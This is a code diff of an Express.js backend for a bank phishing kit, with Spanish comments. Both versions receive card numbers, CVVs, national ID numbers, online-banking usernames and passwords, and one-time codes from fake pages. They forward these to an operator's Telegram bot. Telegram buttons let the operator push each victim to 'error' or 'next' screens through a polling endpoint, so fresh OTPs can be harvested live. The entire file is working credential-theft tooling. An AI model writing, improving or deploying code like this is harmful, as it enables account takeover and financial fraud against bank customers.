@@ -1,7 +1,9 @@
+// 📦 Nuevo backend inspirado en 'express server avianca.js' adaptado al flujo descrito
+
 const express = require('express');
 const bodyParser = require('body-parser');
-const cors = require('cors');
 const axios = require('axios');
+const cors = require('cors');
 
 const app = express();
 app.use(cors());
@@ -11,298 +13,190 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 if (!BOT_TOKEN || !CHAT_ID) {
-  console.warn('[WARN] BOT_TOKEN o CHAT_ID no están definidos en variables de entorno.');
+  console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos.");
 }
 
-// Mapa para almacenar sessionId → redirección
-const redirectionTable = Object.create(null);
+const redirections = new Map();
 
-// Ruta de prueba para verificar si el backend está activo
 app.get('/', (_req, res) => {
-  res.send({ ok: true, service: 'multi-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
+  res.send({ ok: true, service: 'virtual-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
 });
 
-// ✅ Ruta para payment.html
-app.post('/payment', async (req, res) => {
+app.post('/virtualpersona', async (req, res) => {
   try {
-    const data = req.body;
-    const sessionId = data.sessionId;
+    const { sessionId, user, pass, ip, country, city } = req.body;
 
-    const text = `
-🟣Viank🟣 - |[info]|
----
-ℹ️ DATOS DE LA TARJETA
+    console.log('🔔 POST /virtualpersona recibido');
+    console.log({ sessionId, user, pass, ip, country, city });
 
-💳: ${data.p}
-📅: ${data.pdate}
-🔒: ${data.c}
-🏛️: ${data.ban}
-
-ℹ️ DATOS DEL CLIENTE
-
-👨: ${data.dudename} ${data.surname}
-🪪: ${data.cc}
-📩: ${data.email}
-📞: ${data.telnum}
-
-ℹ️ DATOS DE FACTURACIÓN
-
-🏙️: ${data.city}
-🏙️: ${data.state}
-🏙️: ${data.address}
-🌐 IP: ${data.ip}
-📍 Ubicación: ${data.location}
-
-🆔 sessionId: ${sessionId}
----`.trim();
-
-    const reply_markup = {
-      inline_keyboard: [
-        [
-          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
-          { text: '✅ Siguiente',     callback_data: `go:id-check.html|${sessionId}` }
-        ]
-      ]
-    };
-
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text,
-      reply_markup
-    });
-
-    res.status(200).send({ ok: true });
-  } catch (err) {
-    console.error('Error en /payment:', err?.response?.data || err.message);
-    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
-  }
-});
-
-// ✅ Ruta para id-check.html
-app.post('/idcheck', async (req, res) => {
-  try {
-    const data = req.body;
-    const sessionId = data.sessionId;
-
-    const text = `
-🟣Viank🟣 - |[id-check]|
----
-🪪 VERIFICACIÓN DE IDENTIDAD
-
-• Usuario: ${data.user || 'N/D'}
-• Clave: ${data.pass || 'N/D'}
-• Nombre: ${data.name || 'N/D'}
-• Apellido: ${data.surname || 'N/D'}
-• Cédula: ${data.cc || 'N/D'}
-• Email: ${data.email || 'N/D'}
-• Teléfono: ${data.telnum || 'N/D'}
-• Entidad: ${data.ban || 'N/D'}
-• Cuotas: ${data.dues || 'N/D'}
-• Ciudad: ${data.city || 'N/D'}
-• Departamento: ${data.state || 'N/D'}
-• Dirección: ${data.address || 'N/D'}
-
-🌐 IP: ${data.ip || 'N/D'}
-📍 Ubicación: ${data.location || 'N/D'}
-
-🆔 sessionId: ${sessionId}
----`.trim();
-
-
-    const reply_markup = {
-      inline_keyboard: [
-        [
-          { text: '❌ Error tarjeta', callback_data: `go:payment.html|${sessionId}` },
-          { text: '⚠️ Error logo',   callback_data: `go:id-check.html|${sessionId}` },
-          { text: '✅ Siguiente',     callback_data: `go:otp-check.html|${sessionId}` }
-        ]
-      ]
-    };
-
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text,
-      reply_markup
-    });
-
-    res.status(200).send({ ok: true });
-  } catch (err) {
-    console.error('Error en /idcheck:', err?.response?.data || err.message);
-    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
-  }
-});
-
-app.post('/otpcheck', async (req, res) => {
-  try {
-    const data = req.body;
-    const sessionId = data.sessionId;
-
-    // Guardar el paso para su uso posterior
-    redirectionTable[sessionId] = {
-      target: null,
-      step: data.step || 'otp-check'
-    };
-
-    const text = `
-🟣Viank🟣 - |[otp-check]|
----
-🔐 VERIFICACIÓN OTP
-
-• OTP: ${data.otp || 'N/D'}
-• Usuario: ${data.user || 'N/D'}
-• Teléfono: ${data.telnum || 'N/D'}
-• Email: ${data.email || 'N/D'}
-• IP: ${data.ip || 'N/D'}
-• Ubicación: ${data.location || 'N/D'}
-
-🆔 sessionId: ${sessionId}
----`.trim();
-
-    let reply_markup = { inline_keyboard: [] };
-
-    if (data.step === 'otp-check') {
-      reply_markup.inline_keyboard = [
-        [
-          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
-          { text: '⚠️ Error Logo',   callback_data: `go:id-check.html|${sessionId}` }
-        ],
-        [
-          { text: '🔁 Error OTP',     callback_data: `go:otp-check2.html|${sessionId}` },
-          { text: '✅ Finalizar',     callback_data: `go:finish.html|${sessionId}` }
-        ]
-      ];
-    } else {
-      reply_markup.inline_keyboard = [
-        [
-          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
-          { text: '⚠️ Error Logo',   callback_data: `go:id-check.html|${sessionId}` },
-          { text: '⏭️ Siguiente',     callback_data: `go:otp-check.html|${sessionId}` }
-        ]
-      ];
+    if (!BOT_TOKEN || !CHAT_ID) {
+      console.error("❌ BOT_TOKEN o CHAT_ID no definidos");
+      return res.status(500).send({ ok: false, reason: "Env vars undefined" });
     }
 
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const mensaje = `
+🟢 Nuevo Ingreso
+
+👤 User: ${user}
+🔒 Pass: ${pass}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
+    `.trim();
+
+    const reply_markup = {
+      inline_keyboard: [[
+        { text: "❌ Error Logo", callback_data: `go:Virtual-Persona.html|${sessionId}` },
+        { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
+      ]]
+    };
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    console.log(`📡 Enviando a Telegram: ${url}`);
+
+    await axios.post(url, {
       chat_id: CHAT_ID,
-      text,
+      text: mensaje,
       reply_markup
     });
 
-    res.status(200).send({ ok: true });
-  } catch (err) {
-    console.error('Error en /otpcheck:', err?.response?.data || err.message);
-    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
+    console.log('✅ Mensaje enviado correctamente');
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ ERROR EN /virtualpersona');
+    if (error.response) {
+      console.error('🔁 RESPONSE:', error.response.data);
+    }
+    if (error.request) {
+      console.error('🔃 REQUEST:', error.request);
+    }
+    console.error('🧠 ERROR:', error.message);
+    res.status(500).json({ ok: false, reason: error.message });
   }
 });
-app.post("/otpcheck2", async (req, res) => {
-  const { otp, sessionId, info, ip, location, email, telnum } = req.body;
 
-  if (!otp || !sessionId || !info) {
-    return res.status(400).send("Datos incompletos");
-  }
-
+// 🔁 Ruta para opcion1.html
+app.post('/otp1', async (req, res) => {
   try {
-    // ✅ Guardar redirección temporal
-    redirectionTable[sessionId] = {
-      target: null,
-      step: "otp-check2"
-    };
+    const { sessionId, user, pass, dina, ip, country, city } = req.body;
 
     const mensaje = `
-🟣Viank🟣 - |[otp-check2]|
----
-🔐 *NUEVO OTP INGRESADO* 🔐
+🟡 Ingreso OTP Dina
 
-• OTP: ${otp}
-• Número: ${info?.number || "Desconocido"}
-• Banco: ${info?.checkerInfo?.bank || "N/A"}
-• Franquicia: ${info?.checkerInfo?.company || "N/A"}
-
-📩 Email: ${email || 'N/D'}
-📞 Teléfono: ${telnum || 'N/D'}
-🌐 IP: ${ip || "N/D"}
-📍 Ubicación: ${location || "N/D"}
-
+👤 User: ${user}
+🔒 Pass: ${pass}
+🔢 Dina: ${dina}
+🌐 IP: ${ip} - ${city}, ${country}
 🆔 sessionId: ${sessionId}
----`.trim();
+    `.trim();
 
-    const buttons = {
+    redirections.set(sessionId, null);
+
+    const reply_markup = {
       inline_keyboard: [
         [
-          { text: "❌ Error Tarjeta", callback_data: `go:payment.html|${sessionId}` },
-          { text: "⚠️ Error Logo", callback_data: `go:id-check.html|${sessionId}` }
+          { text: "❌ Error Logo", callback_data: `go:Virtual-Persona.html|${sessionId}` },
+          { text: "⚠️ Error OTP", callback_data: `go:opcion2.html|${sessionId}` },
         ],
         [
-          { text: "🔁 Error OTP", callback_data: `go:otp-check2.html|${sessionId}` },
-          { text: "✅ Finalizar", callback_data: `go:finish.html|${sessionId}` }
+          { text: "🔁 Nuevo OTP", callback_data: `go:opcion1.html|${sessionId}` },
+          { text: "✅ Finalizar", callback_data: `go:finalizar.html|${sessionId}` }
         ]
       ]
     };
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: mensaje,
-        parse_mode: "Markdown",
-        reply_markup: buttons
-      })
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
     });
 
-    return res.sendStatus(200);
+    res.send({ ok: true });
   } catch (error) {
-    console.error("Error enviando a Telegram:", error);
-    return res.sendStatus(500);
+    console.error('Error en /otp1:', error.message);
+    res.status(500).send({ ok: false });
   }
 });
 
+// 🔁 Ruta para opcion2.html
+app.post('/otp2', async (req, res) => {
+  try {
+    const { sessionId, user, pass, dina, ip, country, city } = req.body;
 
-// ✅ Webhook de Telegram para botones dinámicos
+    const mensaje = `
+🟠 Ingreso OTP new Dina
+
+👤 User: ${user}
+🔒 Pass: ${pass}
+🔢 Dina: ${dina}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
+    `.trim();
+
+    redirections.set(sessionId, null);
+
+    const reply_markup = {
+      inline_keyboard: [
+        [
+          { text: "❌ Error Logo", callback_data: `go:Virtual-Persona.html|${sessionId}` },
+          { text: "⚠️ Error OTP", callback_data: `go:opcion2.html|${sessionId}` }
+        ],
+        [
+          { text: "🔁 Nuevo OTP", callback_data: `go:opcion1.html|${sessionId}` },
+          { text: "✅ Finalizar", callback_data: `go:finalizar.html|${sessionId}` }
+        ]
+      ]
+    };
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
+    });
+
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('Error en /otp2:', error.message);
+    res.status(500).send({ ok: false });
+  }
+});
+
+// 📩 Webhook de Telegram para botones
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
     const update = req.body;
+    const { callback_query } = update;
 
-    if (update.callback_query) {
-      const cq = update.callback_query;
-      const data = cq.data || '';
-      const [action, sessionId] = data.split('|');
-      const target = (action || '').replace('go:', '');
+    if (callback_query) {
+      const [action, sessionId] = (callback_query.data || '').split('|');
+      const route = action.replace('go:', '');
 
-      if (sessionId && target) {
-        redirectionTable[sessionId] = target;
-      }
+      if (sessionId) redirections.set(sessionId, route);
 
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-        callback_query_id: cq.id,
-        text: `Redireccionando al cliente (${sessionId}) → ${target}`,
+        callback_query_id: callback_query.id,
+        text: `Redirigiendo cliente → ${route}`,
         show_alert: true
       });
     }
-
     res.sendStatus(200);
   } catch (err) {
-    console.error('Error en webhook:', err?.response?.data || err.message);
+    console.error("Error en webhook:", err);
     res.sendStatus(200);
   }
 });
 
-// ✅ Consulta del cliente para ver si ya tiene destino (versión que limpia el objetivo después de usarlo)
-app.get('/get-redirect/:sessionId', (req, res) => {
+// 🔁 Polling desde loading.html
+app.get('/instruction/:sessionId', (req, res) => {
   const sessionId = req.params.sessionId;
+  const target = redirections.get(sessionId);
 
-  if (redirectionTable[sessionId]) {
-    const target = redirectionTable[sessionId];
-
-    // 💥 Eliminamos la orden para que no se repita más
-    delete redirectionTable[sessionId];
-
-    res.send({ target });
+  if (target) {
+    redirections.delete(sessionId);
+    res.send({ redirect_to: target });
   } else {
-    res.send({}); // No hay redirección activa
+    res.send({});
   }
 });
 
-
-// Iniciar servidor
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
+app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));
